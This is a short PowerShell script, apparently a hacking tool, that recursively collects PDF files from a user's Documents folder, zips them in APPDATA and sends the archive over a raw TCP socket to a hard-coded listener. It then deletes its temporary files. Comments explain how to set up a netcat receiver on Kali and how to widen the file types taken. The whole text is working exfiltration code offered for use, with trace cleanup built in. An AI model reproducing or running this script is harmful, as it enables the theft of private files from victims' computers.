#edit ip and port of your listener... listener is on the machine you want to send data to... I use netcat as listener... (example command on kali.. [nc -l -p 54321 > out.file])
[int] $Port = 54321
$IP = "192.168.222.63"
#edit this to specify your target
$rootFolder = "$ENV:UserProfile\Documents"
#edit include to specify filetypes...(*.doc*,*.txt,*.jpg) whatevs...
$files = Get-ChildItem -Path $rootFolder -Include *.pdf -Recurse

#only edit under this if you know what you are doing
#temp location to perform file copy and zip
$tempFolderRoot = $env:APPDATA
$tempFolderFinal = $tempFolderRoot+"\"+$env:UserName+"-Docs"
New-Item -ItemType directory -Path $tempFolderFinal -Force
foreach($file in $files)
{Copy-Item "$file" -destination $tempFolderFinal}
$CompressionToUse = [System.IO.Compression.CompressionLevel]::Fastest
$IncludeBaseFolder = $false
$zipTo = "{0}\{1}.zip" -f $tempFolderRoot,"ZIPPED"
[Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" )
[System.IO.Compression.ZipFile]::CreateFromDirectory($tempFolderFinal, $ZipTo, $CompressionToUse, $IncludeBaseFolder)
$Address = [system.net.IPAddress]::Parse($IP) 
$socket = new-object System.Net.Sockets.TcpClient
$socket.connect($Address, $port)
$stream = $socket.GetStream()
$file = Get-Item $Env:APPDATA\ZIPPED.zip
$fileData = [IO.File]::ReadAllBytes($file)
$stream.Write($fileData, 0, $fileData.Length)
$stream.Close()
$Socket.Close()

#clean up temp files
Remove-Item $tempFolderFinal -RECURSE
Remove-Item $Env:APPDATA\ZIPPED.zip
  